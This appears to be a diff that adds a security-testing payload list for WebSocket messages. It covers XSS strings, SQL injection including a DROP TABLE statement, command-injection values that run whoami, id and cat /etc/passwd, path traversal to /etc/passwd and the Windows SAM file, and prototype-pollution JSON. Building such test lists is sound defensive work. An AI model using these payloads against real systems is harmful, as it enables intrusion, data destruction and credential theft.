@@ -1,0 +1,46 @@
+# WebSocket Security Test Payloads
+# For testing message injection and authentication issues
+
+# XSS payloads for WebSocket messages
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+"><script>alert('XSS')</script>
+{{constructor.constructor('alert(1)')()}}
+${alert('XSS')}
+<svg onload=alert('XSS')>
+
+# SQL Injection in WebSocket messages
+' OR '1'='1
+" OR "1"="1
+1; DROP TABLE users--
+1 UNION SELECT * FROM users
+' OR 1=1--
+admin'--
+
+# Command injection
+; ls -la
+| cat /etc/passwd
+`whoami`
+$(id)
+; ping -c 10 127.0.0.1
+
+# Path traversal
+../../../etc/passwd
+..\..\..\..\windows\system32\config\sam
+....//....//....//etc/passwd
+
+# JSON injection
+{"action":"admin","user":"test"}
+{"__proto__":{"admin":true}}
+{"constructor":{"prototype":{"admin":true}}}
+
+# Binary protocol tests
+\x00\x00\x00\x00
+\xff\xff\xff\xff
+
+# Large payload for DoS testing
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+# Unicode and encoding
+%00%00%00%00
+\u0000\u0000
